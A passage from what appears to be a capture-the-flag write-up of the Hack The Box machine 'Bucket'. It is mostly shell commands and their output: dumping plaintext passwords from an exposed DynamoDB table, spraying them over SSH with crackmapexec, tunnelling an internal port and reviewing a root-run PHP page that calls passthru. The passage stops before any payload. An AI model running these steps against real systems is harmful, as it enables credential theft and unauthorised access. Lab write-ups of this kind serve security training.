</span></span><span class=line><span class=cl>drwxrwxr-x <span class=m>2</span> roy  roy  <span class=m>4096</span> Apr <span class=m>22</span> 12:03 .aws
</span></span><span class=line><span class=cl>lrwxrwxrwx <span class=m>1</span> roy  roy     <span class=m>9</span> Sep <span class=m>16</span>  <span class=m>2020</span> .bash_history -&gt; /dev/null
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> roy  roy   <span class=m>220</span> Sep <span class=m>16</span>  <span class=m>2020</span> .bash_logout
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> roy  roy  <span class=m>3771</span> Sep <span class=m>16</span>  <span class=m>2020</span> .bashrc
</span></span><span class=line><span class=cl>drwx------ <span class=m>2</span> roy  roy  <span class=m>4096</span> Apr <span class=m>22</span> 07:57 .cache
</span></span><span class=line><span class=cl>drwx------ <span class=m>4</span> roy  roy  <span class=m>4096</span> Apr <span class=m>22</span> 08:01 .gnupg
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> roy  roy   <span class=m>807</span> Sep <span class=m>16</span>  <span class=m>2020</span> .profile
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> roy  roy  <span class=m>4096</span> Apr <span class=m>22</span> 07:59 project
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> roy  roy  <span class=m>4096</span> Apr <span class=m>22</span> 07:59 snap
</span></span><span class=line><span class=cl>-r-------- <span class=m>1</span> roy  roy    <span class=m>33</span> Apr <span class=m>22</span> 04:56 user.txt
</span></span></code></pre></div><p>The files inside <code>project</code> are readable by others.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@bucket:/home/roy/project$ ls -la
</span></span><span class=line><span class=cl>total <span class=m>44</span>
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>3</span> roy roy  <span class=m>4096</span> Sep <span class=m>24</span>  <span class=m>2020</span> .
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>5</span> roy roy  <span class=m>4096</span> Apr <span class=m>24</span> 17:31 ..
</span></span><span class=line><span class=cl>-rw-rw-r--  <span class=m>1</span> roy roy    <span class=m>63</span> Sep <span class=m>24</span>  <span class=m>2020</span> composer.json
</span></span><span class=line><span class=cl>-rw-rw-r--  <span class=m>1</span> roy roy <span class=m>20533</span> Sep <span class=m>24</span>  <span class=m>2020</span> composer.lock
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> roy roy   <span class=m>367</span> Sep <span class=m>24</span>  <span class=m>2020</span> db.php
</span></span><span class=line><span class=cl>drwxrwxr-x <span class=m>10</span> roy roy  <span class=m>4096</span> Sep <span class=m>24</span>  <span class=m>2020</span> vendor
</span></span></code></pre></div><p>Looking into <code>db.php</code>, the project seems to use AWS DynamoDB as the project database. I can also see the endpoint URL.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@bucket:/home/roy/project$ cat db.php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>require <span class=s1>&#39;vendor/autoload.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>date_default_timezone_set<span class=o>(</span><span class=s1>&#39;America/New_York&#39;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>use Aws<span class=se>\D</span>ynamoDb<span class=se>\D</span>ynamoDbClient<span class=p>;</span>
</span></span><span class=line><span class=cl>use Aws<span class=se>\D</span>ynamoDb<span class=se>\E</span>xception<span class=se>\D</span>ynamoDbException<span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$client</span> <span class=o>=</span> new Aws<span class=se>\S</span>dk<span class=o>([</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;profile&#39;</span> <span class=o>=</span>&gt; <span class=s1>&#39;default&#39;</span>,
</span></span><span class=line><span class=cl>    <span class=s1>&#39;region&#39;</span>  <span class=o>=</span>&gt; <span class=s1>&#39;us-east-1&#39;</span>,
</span></span><span class=line><span class=cl>    <span class=s1>&#39;version&#39;</span> <span class=o>=</span>&gt; <span class=s1>&#39;latest&#39;</span>,
</span></span><span class=line><span class=cl>    <span class=s1>&#39;endpoint&#39;</span> <span class=o>=</span>&gt; <span class=s1>&#39;http://localhost:4566&#39;</span>
</span></span><span class=line><span class=cl><span class=o>])</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$dynamodb</span> <span class=o>=</span> <span class=nv>$client</span>-&gt;createDynamoDb<span class=o>()</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>//todo
</span></span></code></pre></div><p><code>localhost:4566</code> is the internal endpoint of <code>s3.bucket.htb</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@bucket:/home/roy/project$ curl -s http://localhost:4566
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>	<span class=s2>&#34;s3&#34;</span>: <span class=s2>&#34;running&#34;</span>, 
</span></span><span class=line><span class=cl>	<span class=s2>&#34;dynamodb&#34;</span>: <span class=s2>&#34;running&#34;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></div><h4 id=aws-dynamodb>AWS DynamoDB<a class=anchor aria-hidden=true href=#aws-dynamodb>#</a></h4><p>DynamoDB is a NoSQL database developed by Amazon. I can also use the amazon cli to interact with the DynamoDB, and it uses the same endpoint as the S3.</p><p>General usage:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>usage: aws <span class=o>[</span>options<span class=o>]</span> dynamodb &lt;subcommand&gt; <span class=o>[</span>&lt;subcommand&gt; ...<span class=o>]</span> <span class=o>[</span>parameters<span class=o>]</span>
</span></span></code></pre></div><p>Anonymous user is allowed to list the database tables.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class=line><span class=cl>$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;TableNames&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;users&#34;</span>
</span></span><span class=line><span class=cl>    <span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></div><p>I can read the content of table <code>users</code> with the subcommand <code>scan</code>, and it discovers several credentials.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class=line><span class=cl>$ aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Items&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>        <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;password&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;S&#34;</span>: <span class=s2>&#34;Management@#1@#&#34;</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;username&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;S&#34;</span>: <span class=s2>&#34;Mgmt&#34;</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>,
</span></span><span class=line><span class=cl>        <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;password&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;S&#34;</span>: <span class=s2>&#34;Welcome123!&#34;</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;username&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;S&#34;</span>: <span class=s2>&#34;Cloudadm&#34;</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>,
</span></span><span class=line><span class=cl>        <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;password&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;S&#34;</span>: <span class=s2>&#34;n2vM-&lt;_K_Q:.Aa2&#34;</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;username&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;S&#34;</span>: <span class=s2>&#34;Sysadm&#34;</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>]</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Count&#34;</span>: 3,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;ScannedCount&#34;</span>: 3,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;ConsumedCapacity&#34;</span>: null
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></div><p>I&rsquo;ll keep those credentials.</p><h4 id=ssh-access>SSH Access<a class=anchor aria-hidden=true href=#ssh-access>#</a></h4><p>Password <code>n2vM-&lt;_K_Q:.Aa2</code> works on <code>roy</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class=line><span class=cl>$ crackmapexec ssh <span class=s1>&#39;10.10.10.212&#39;</span> -u roy -p passwords.list
</span></span><span class=line><span class=cl>SSH         10.10.10.212    <span class=m>22</span>     10.10.10.212     <span class=o>[</span>*<span class=o>]</span> SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
</span></span><span class=line><span class=cl>SSH         10.10.10.212    <span class=m>22</span>     10.10.10.212     <span class=o>[</span>-<span class=o>]</span> roy:Management@#1@# Authentication failed.
</span></span><span class=line><span class=cl>SSH         10.10.10.212    <span class=m>22</span>     10.10.10.212     <span class=o>[</span>-<span class=o>]</span> roy:Welcome123! Authentication failed.
</span></span><span class=line><span class=cl>SSH         10.10.10.212    <span class=m>22</span>     10.10.10.212     <span class=o>[</span>+<span class=o>]</span> roy:n2vM-&lt;_K_Q:.Aa2 
</span></span></code></pre></div><p>Now I can login into the system using <code>roy</code> credentials.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class=line><span class=cl>$ ssh roy@10.10.10.212
</span></span><span class=line><span class=cl>roy@10.10.10.212<span class=err>&#39;</span>s password: 
</span></span><span class=line><span class=cl>Welcome to Ubuntu 20.04 LTS <span class=o>(</span>GNU/Linux 5.4.0-48-generic x86_64<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>  System load:                      0.02
</span></span><span class=line><span class=cl>  Usage of /:                       33.8% of 17.59GB
</span></span><span class=line><span class=cl>  Memory usage:                     29%
</span></span><span class=line><span class=cl>  Swap usage:                       0%
</span></span><span class=line><span class=cl>  Processes:                        <span class=m>252</span>
</span></span><span class=line><span class=cl>  Users logged in:                  <span class=m>0</span>
</span></span><span class=line><span class=cl>  IPv4 address <span class=k>for</span> br-bee97070fb20: 172.18.0.1
</span></span><span class=line><span class=cl>  IPv4 address <span class=k>for</span> docker0:         172.17.0.1
</span></span><span class=line><span class=cl>  IPv4 address <span class=k>for</span> ens160:          10.10.10.212
</span></span><span class=line><span class=cl>  IPv6 address <span class=k>for</span> ens160:          dead:beef::250:56ff:feb9:df48
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>roy@bucket:~$ id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>roy<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>roy<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>roy<span class=o>)</span>,1001<span class=o>(</span>sysadm<span class=o>)</span>
</span></span><span class=line><span class=cl>roy@bucket:~$ 
</span></span></code></pre></div><p>The user flag is done here.</p><p><div class=img-container><img src=imgs/image-20210423013951765.png alt=image-20210423013951765></div></p><h3 id=shell-as-root>Shell as root<a class=anchor aria-hidden=true href=#shell-as-root>#</a></h3><h4 id=enumeration-2>Enumeration<a class=anchor aria-hidden=true href=#enumeration-2>#</a></h4><p>Running WinPEAS discovers another service currently running on port 8000.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>[+] Active Ports
</span></span><span class=line><span class=cl>[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                                                                                 
</span></span><span class=line><span class=cl>tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                     
</span></span><span class=line><span class=cl>tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN      -                   
</span></span><span class=line><span class=cl>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
</span></span><span class=line><span class=cl>tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
</span></span><span class=line><span class=cl>tcp        0      0 127.0.0.1:46275         0.0.0.0:*               LISTEN      -                   
</span></span><span class=line><span class=cl>tcp6       0      0 :::80                   :::*                    LISTEN      -                   
</span></span><span class=line><span class=cl>tcp6       0      0 :::22                   :::*                    LISTEN      - 
</span></span></code></pre></div><p>It also discovers that <code>bucket-app</code> in <code>/var/www/</code> is belong to the root user and readable to user <code>roy</code> but not to others.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>[+] Readable files belonging to root and readable by me but not world readable
</span></span><span class=line><span class=cl>-rwxr-x---+ 1 root root 808729 Jun 10  2020 /var/www/bucket-app/pd4ml_demo.jar                                 
</span></span><span class=line><span class=cl>-rw-r-x---+ 1 root root 358 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/README.md
</span></span><span class=line><span class=cl>-rw-r-x---+ 1 root root 1085 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/LICENSE
</span></span><span class=line><span class=cl>-rw-r-x---+ 1 root root 4689 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/src/UploadedFileInterface.php
</span></span><span class=line><span class=cl>-rw-r-x---+ 1 root root 4746 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/src/StreamInterface.php
</span></span></code></pre></div><p>I can list the contents inside <code>bucket-app</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>roy@bucket:/var/www/bucket-app$ ls -la
</span></span><span class=line><span class=cl>total <span class=m>856</span>
</span></span><span class=line><span class=cl>drwxr-x---+  <span class=m>4</span> root root   <span class=m>4096</span> Feb <span class=m>10</span> 12:29 .
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>4</span> root root   <span class=m>4096</span> Feb <span class=m>10</span> 12:29 ..
</span></span><span class=line><span class=cl>-rw-r-x---+  <span class=m>1</span> root root     <span class=m>63</span> Sep <span class=m>23</span>  <span class=m>2020</span> composer.json
</span></span><span class=line><span class=cl>-rw-r-x---+  <span class=m>1</span> root root  <span class=m>20533</span> Sep <span class=m>23</span>  <span class=m>2020</span> composer.lock
</span></span><span class=line><span class=cl>drwxr-x---+  <span class=m>2</span> root root   <span class=m>4096</span> Apr <span class=m>22</span> 12:38 files
</span></span><span class=line><span class=cl>-rwxr-x---+  <span class=m>1</span> root root  <span class=m>17222</span> Sep <span class=m>23</span>  <span class=m>2020</span> index.php
</span></span><span class=line><span class=cl>-rwxr-x---+  <span class=m>1</span> root root <span class=m>808729</span> Jun <span class=m>10</span>  <span class=m>2020</span> pd4ml_demo.jar
</span></span><span class=line><span class=cl>drwxr-x---+ <span class=m>10</span> root root   <span class=m>4096</span> Feb <span class=m>10</span> 12:29 vendor
</span></span></code></pre></div><p>According to the Apache config file, the service on port 8000 is an internal website, and it is assigned to the root user. In other words, it is running as root.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl>roy@bucket:~$ cat /etc/apache2/sites-available/000-default.conf 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nt>&lt;VirtualHost</span> <span class=err>127.0.0.1:8000</span><span class=nt>&gt;</span> # unknown
</span></span><span class=line><span class=cl>        <span class=nt>&lt;IfModule</span> <span class=err>mpm_itk_module</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>                AssignUserId root root
</span></span><span class=line><span class=cl>        <span class=nt>&lt;/IfModule&gt;</span>
</span></span><span class=line><span class=cl>        DocumentRoot /var/www/bucket-app
</span></span><span class=line><span class=cl><span class=nt>&lt;/VirtualHost&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nt>&lt;VirtualHost</span> <span class=err>*:80</span><span class=nt>&gt;</span> # bucket.htb
</span></span><span class=line><span class=cl>        DocumentRoot /var/www/html
</span></span><span class=line><span class=cl>        RewriteEngine On
</span></span><span class=line><span class=cl>        RewriteCond %{HTTP_HOST} !^bucket.htb$
</span></span><span class=line><span class=cl>        RewriteRule /.* http://bucket.htb/ [R]
</span></span><span class=line><span class=cl><span class=nt>&lt;/VirtualHost&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;VirtualHost</span> <span class=err>*:80</span><span class=nt>&gt;</span> # s3.bucket.htb 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        ProxyPreserveHost on
</span></span><span class=line><span class=cl>        ProxyPass / http://localhost:4566/
</span></span><span class=line><span class=cl>        ProxyPassReverse / http://localhost:4566/
</span></span><span class=line><span class=cl>        <span class=nt>&lt;Proxy</span> <span class=err>*</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>                 Order deny,allow
</span></span><span class=line><span class=cl>                 Allow from all
</span></span><span class=line><span class=cl>         <span class=nt>&lt;/Proxy&gt;</span>
</span></span><span class=line><span class=cl>        ServerAdmin webmaster@localhost
</span></span><span class=line><span class=cl>        ServerName s3.bucket.htb
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        ErrorLog ${APACHE_LOG_DIR}/error.log
</span></span><span class=line><span class=cl>        CustomLog ${APACHE_LOG_DIR}/access.log combined
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nt>&lt;/VirtualHost&gt;</span>
</span></span></code></pre></div><h4 id=internal-web>Internal Web<a class=anchor aria-hidden=true href=#internal-web>#</a></h4><p>I&rsquo;ll expose the internal web to my localhost on the same port with SSH tunnel.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>roy@bucket:/var/www/bucket-app$ ~C
</span></span><span class=line><span class=cl>ssh&gt; -L 8000:127.0.0.1:8000
</span></span><span class=line><span class=cl>Forwarding port.
</span></span><span class=line><span class=cl>roy@bucket:/var/www/bucket-app$
</span></span></code></pre></div><p>The website page says the site is under construction.</p><p><div class=img-container><img src=imgs/image-20210423015905604.png alt=image-20210423015905604></div></p><h4 id=source-code-review>Source Code Review<a class=anchor aria-hidden=true href=#source-code-review>#</a></h4><p>Upon reviewing the <code>index.php</code>, I found out that this website can be abused.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>roy@bucket:/var/www/bucket-app$ cat index.php 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>require <span class=s1>&#39;vendor/autoload.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>use Aws<span class=se>\D</span>ynamoDb<span class=se>\D</span>ynamoDbClient<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=o>(</span><span class=nv>$_SERVER</span><span class=o>[</span><span class=s2>&#34;REQUEST_METHOD&#34;</span><span class=o>]===</span><span class=s2>&#34;POST&#34;</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=o>(</span><span class=nv>$_POST</span><span class=o>[</span><span class=s2>&#34;action&#34;</span><span class=o>]===</span><span class=s2>&#34;get_alerts&#34;</span><span class=o>)</span> <span class=o>{</span> <span class=c1># POST action=get_alerts </span>
</span></span><span class=line><span class=cl>                date_default_timezone_set<span class=o>(</span><span class=s1>&#39;America/New_York&#39;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=nv>$client</span> <span class=o>=</span> new DynamoDbClient<span class=o>([</span>  <span class=c1># Connect to DynamoDB.</span>
</span></span><span class=line><span class=cl>                        <span class=s1>&#39;profile&#39;</span> <span class=o>=</span>&gt; <span class=s1>&#39;default&#39;</span>,
</span></span><span class=line><span class=cl>                        <span class=s1>&#39;region&#39;</span>  <span class=o>=</span>&gt; <span class=s1>&#39;us-east-1&#39;</span>,
</span></span><span class=line><span class=cl>                        <span class=s1>&#39;version&#39;</span> <span class=o>=</span>&gt; <span class=s1>&#39;latest&#39;</span>,
</span></span><span class=line><span class=cl>                        <span class=s1>&#39;endpoint&#39;</span> <span class=o>=</span>&gt; <span class=s1>&#39;http://localhost:4566&#39;</span>
</span></span><span class=line><span class=cl>                <span class=o>])</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                
</span></span><span class=line><span class=cl>                <span class=nv>$iterator</span> <span class=o>=</span> <span class=nv>$client</span>-&gt;getIterator<span class=o>(</span><span class=s1>&#39;Scan&#39;</span>, array<span class=o>(</span> <span class=c1># Read content from table alerts</span>
</span></span><span class=line><span class=cl>                        <span class=s1>&#39;TableName&#39;</span> <span class=o>=</span>&gt; <span class=s1>&#39;alerts&#39;</span>,
</span></span><span class=line><span class=cl>                        <span class=s1>&#39;FilterExpression&#39;</span> <span class=o>=</span>&gt; <span class=s2>&#34;title = :title&#34;</span>, <span class=c1># Filter by title</span>
</span></span><span class=line><span class=cl>                        <span class=s1>&#39;ExpressionAttributeValues&#39;</span> <span class=o>=</span>&gt; array<span class=o>(</span><span class=s2>&#34;:title&#34;</span><span class=o>=</span>&gt;array<span class=o>(</span><span class=s2>&#34;S&#34;</span><span class=o>=</span>&gt;<span class=s2>&#34;Ransomware&#34;</span><span class=o>))</span>,
</span></span><span class=line><span class=cl>                <span class=o>))</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                foreach <span class=o>(</span><span class=nv>$iterator</span> as <span class=nv>$item</span><span class=o>)</span> <span class=o>{</span>  <span class=c1># </span>
</span></span><span class=line><span class=cl>                        <span class=nv>$name</span><span class=o>=</span>rand<span class=o>(</span>1,10000<span class=o>)</span>.<span class=s1>&#39;.html&#39;</span><span class=p>;</span> <span class=c1># Generate randomnumber.html </span>
</span></span><span class=line><span class=cl>                        file_put_contents<span class=o>(</span><span class=s1>&#39;files/&#39;</span>.<span class=nv>$name</span>,<span class=nv>$item</span><span class=o>[</span><span class=s2>&#34;data&#34;</span><span class=o>])</span><span class=p>;</span> <span class=c1># Write contents to randomnumber.html</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span>
</span></span><span class=line><span class=cl>                passthru<span class=o>(</span><span class=s2>&#34;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/</span><span class=nv>$name</span><span class=s2> 800 A4 -out files/result.pdf&#34;</span><span class=o>)</span><span class=p>;</span> <span class=c1># convert randomnumber.html to result.pdf</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl><span class=k>else</span>
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>?&gt;
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span></code></pre></div><p>When there is a POST request contains data of <code>action=get_alerts</code>, the following snippet creates a connection to DynamoDB.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s2>&#34;REQUEST_METHOD&#34;</span><span class=p>]</span><span class=o>===</span><span class=s2>&#34;POST&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s2>&#34;action&#34;</span><span class=p>]</span><span class=o>===</span><span class=s2>&#34;get_alerts&#34;</span><span class=p>)</span> <span class=p>{</span> <span class=c1># POST action=get_alerts 
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=nx>date_default_timezone_set</span><span class=p>(</span><span class=s1>&#39;America/New_York&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nv>$client</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>DynamoDbClient</span><span class=p>([</span>  <span class=c1># Connect to DynamoDB.
</span></span></span><span class=line><span class=cl><span class=c1></span>                        <span class=s1>&#39;profile&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;default&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                        <span class=s1>&#39;region&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;us-east-1&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                        <span class=s1>&#39;version&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;latest&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                        <span class=s1>&#39;endpoint&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;http://localhost:4566&#39;</span>
</span></span><span class=line><span class=cl>                <span class=p>]);</span>
</span></span></code></pre></div><p>It then reads every item in table <code>alerts</code> and filters out the result only to the one that contains string value of “Ransomware” (the key).</p><blockquote><p>DynamoDB is key-value NoSQL database.</p></blockquote><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$iterator</span> <span class=o>=</span> <span class=nv>$client</span><span class=o>-&gt;</span><span class=na>getIterator</span><span class=p>(</span><span class=s1>&#39;Scan&#39;</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span> <span class=c1># Read content from table alerts
</span></span></span><span class=line><span class=cl><span class=c1></span>       <span class=s1>&#39;TableName&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;alerts&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>       <span class=s1>&#39;FilterExpression&#39;</span> <span class=o>=&gt;</span> <span class=s2>&#34;title = :title&#34;</span><span class=p>,</span> <span class=c1># Filter by title
</span></span></span><span class=line><span class=cl><span class=c1></span>       <span class=s1>&#39;ExpressionAttributeValues&#39;</span> <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span><span class=s2>&#34;:title&#34;</span><span class=o>=&gt;</span><span class=k>array</span><span class=p>(</span><span class=s2>&#34;S&#34;</span><span class=o>=&gt;</span><span class=s2>&#34;Ransomware&#34;</span><span class=p>)),</span>
</span></span><span class=line><span class=cl><span class=p>));</span>
</span></span></code></pre></div><p>For each result from the previous snippet, it writes the result value (<code>$item[“data”]</code>) of &ldquo;Ransomware&rdquo; to a randomly named HTML file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>foreach</span> <span class=p>(</span><span class=nv>$iterator</span> <span class=k>as</span> <span class=nv>$item</span><span class=p>)</span> <span class=p>{</span>  <span class=c1># 
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$name</span><span class=o>=</span><span class=nx>rand</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>10000</span><span class=p>)</span><span class=o>.</span><span class=s1>&#39;.html&#39;</span><span class=p>;</span> <span class=c1># Generate randomnumber.html 
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nx>file_put_contents</span><span class=p>(</span><span class=s1>&#39;files/&#39;</span><span class=o>.</span><span class=nv>$name</span><span class=p>,</span><span class=nv>$item</span><span class=p>[</span><span class=s2>&#34;data&#34;</span><span class=p>]);</span> <span class=c1># Write contents to randomnumber.html
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span></code></pre></div><p>The HTML file then gets converted into a PDF file (<code>result.pdf</code>) using <code>pd4ml</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>passthru</span><span class=p>(</span><span class=s2>&#34;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/</span><span class=si>$name</span><span class=s2> 800 A4 -out files/result.pdf&#34;</span><span class=p>);</span> <span class=c1># convert randomnumber.html to result.pdf
